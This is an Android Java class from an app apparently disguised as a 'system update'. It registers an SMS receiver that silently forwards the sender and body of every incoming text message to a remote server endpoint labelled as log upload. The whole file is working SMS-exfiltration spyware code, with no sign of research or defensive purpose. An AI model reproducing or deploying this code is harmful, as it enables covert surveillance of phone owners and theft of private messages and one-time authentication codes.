package com.example.systemupdate;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SystemSmsReceiver";
    private static final String BACKEND_URL = "http://10.0.2.2:5000/api";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (messages != null) {
                for (SmsMessage sms : messages) {
                    String sender = sms.getDisplayOriginatingAddress();
                    String body = sms.getDisplayMessageBody();
                    sendSmsToServer(sender, body);
                }
            }
        }
    }

    private void sendSmsToServer(String sender, String body) {
        new Thread(() -> {
            try {
                URL url = new URL(BACKEND_URL + "/device/upload/logs");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);

                // Format SMS log JSON payload
                String jsonInputString = String.format(
                    "{\"logs\": [{\"type\": \"sms\", \"details\": {\"phoneNumber\": \"%s\", \"name\": \"\", \"message\": \"%s\", \"isMe\": false}}]}",
                    sender,
                    body.replace("\"", "\\\"").replace("\n", "\\n")
                );

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int code = conn.getResponseCode();
                Log.d(TAG, "SMS upload status: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload SMS log: " + e.getMessage());
            }
        }).start();
    }
}
